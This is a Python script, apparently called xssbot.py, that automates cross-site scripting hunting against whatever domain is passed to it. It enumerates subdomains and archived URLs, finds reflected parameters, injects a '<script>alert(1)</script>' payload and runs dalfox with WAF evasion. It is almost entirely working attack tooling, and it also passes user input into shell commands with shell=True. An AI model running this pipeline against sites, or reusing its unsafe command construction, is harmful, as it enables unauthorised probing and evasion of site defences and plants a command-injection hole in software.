import sys
import os
import time
from subprocess import run

def run_command(command):
    process = run(command, shell=True)
    process.check_returncode()

def execute_subfinder(domain, subfile):
    command = f"subfinder -d {domain} -o {subfile}"
    run_command(command)

def execute_httpx(subfile, h1):
    command = f"httpx -l {subfile} -o {h1}"
    run_command(command)

def execute_grepgy(itags, h1, waybackurls):
    command = f"grepgy -i {itags} {h1} | waybackurls | anew {waybackurls}"
    run_command(command)

def execute_gxss(params, waybackurls, reflected):
    command = f"grepgy -i {params} {waybackurls} | Gxss | anew {reflected}"
    run_command(command)

def execute_grepgy_qsreplace(gxss, reflected, payload, freqxss):
    command = f"grepgy -i {gxss} {reflected} | qsreplace {payload} | freq | anew {freqxss}"
    run_command(command)

def execute_dalfox(gxss, reflected):
    command = f"grepgy -i {gxss} {reflected} | dalfox pipe --skip-bav --waf-evasion --skip-mining-all | anew dalfox.txt"
    run_command(command)

print("Use: python3 xssbot.py example.com")

domain = sys.argv[1]

subfile = f"{domain.split('.')[0]}_subs.txt"
h1 = f"{domain.split('.')[0]}_h1.txt"
waybackurls = f"{domain.split('.')[0]}_waymass.txt"
reflected = f"{domain.split('.')[0]}_reflected.txt"
freqxss = f"{domain.split('.')[0]}_freqxss.txt"
itags = "http:"
payload = "'<script>alert(1)</script>'"
params = "="
gxss = "Gxss"

execute_subfinder(domain, subfile)
execute_httpx(subfile, h1)
execute_grepgy(itags, h1, waybackurls)
execute_gxss(params, waybackurls, reflected)

time.sleep(20)

execute_grepgy_qsreplace(gxss, reflected, payload, freqxss)
execute_dalfox(gxss, reflected)

